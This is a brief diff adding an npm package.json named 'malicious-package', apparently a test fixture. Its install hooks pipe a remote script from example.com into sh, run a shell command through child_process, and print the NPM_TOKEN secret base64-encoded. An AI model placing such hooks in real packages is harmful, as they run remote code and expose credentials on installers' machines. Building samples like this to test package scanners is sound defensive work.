@@ -1,0 +1,9 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl https://example.com/payload.sh | sh",
+    "postinstall": "node -e \"require('child_process').exec('whoami')\"",
+    "install": "echo $NPM_TOKEN | base64"
+  }
+}
